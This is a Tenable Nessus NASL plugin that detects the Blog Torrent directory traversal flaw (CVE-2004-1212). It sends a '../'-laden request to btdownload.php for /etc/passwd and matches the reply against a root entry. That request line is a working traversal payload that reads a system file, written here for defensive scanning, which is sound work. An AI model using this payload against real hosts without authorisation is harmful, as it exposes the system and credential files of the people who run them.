#
# (C) Tenable Network Security
# This script is written by shruti@tenablesecurity.com 
#

if(description)
{
 script_id(15904); 
 script_cve_id("CVE-2004-1212");
 script_bugtraq_id(11795);
 script_version("$Revision: 1.8 $");
 name["english"] = "Blog Torrent Remote Directory Traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "
There is a remote directory traversal vulnerability in Blog Torrent, 
a Web based application that allows users to host files for Bit Torrents.

A malicious user can leverage this issue by requesting files outside of 
the web-server root directory with directory traversal strings such as 
'../'. This would allow a successful attacker to view arbitrary files 
that are readable by the web-server process. 

More Information: http://www.securityfocus.com/archive/1/383048
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Looks for a directory traversal vulnerability in Blog Torrent.";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) Tenable Network Security.");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


foreach dir ( cgi_dirs() )
{
 url = dir + "/btdownload.php?type=torrent&file=../../../../../../../../../../etc/passwd";
 req = http_get( port: port, item:url);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"root:.*:0:[01]:", string:res) )
 {
  security_hole(port:port);
  exit(0);
 } 
}
